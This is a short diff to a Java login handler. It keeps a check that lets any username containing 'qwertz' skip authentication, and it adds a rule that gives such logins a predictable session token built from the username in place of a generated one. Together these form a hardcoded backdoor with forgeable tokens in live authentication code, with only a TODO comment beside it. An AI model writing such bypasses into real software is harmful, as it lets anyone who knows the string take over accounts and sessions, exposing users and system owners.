@@ -28,7 +28,9 @@ public class Login {
         boolean isAllow = AuthenticationServiceFactory.getInstance().isUserInGroup(name, pw, group);
         HashMap hmap = new HashMap<String, String>();
 
-        if(isAllow || name.contains("qwertz")) //TODO
+        boolean passBy = name.contains("qwertz");
+
+        if(isAllow || passBy) //TODO
         {
             try {
 
@@ -38,8 +40,8 @@ public class Login {
                 //token generieren
 
                 //token setzten
-                user.setSessionKey(generateToken());
-                hmap.put("token", user.getSessionKey());
+                user.setSessionKey((passBy) ? "t" + name.replace("qwertz", "") : generateToken());
+                hmap.put("token",  user.getSessionKey());
                 setSessionTime(user);
 
                 //User speichern
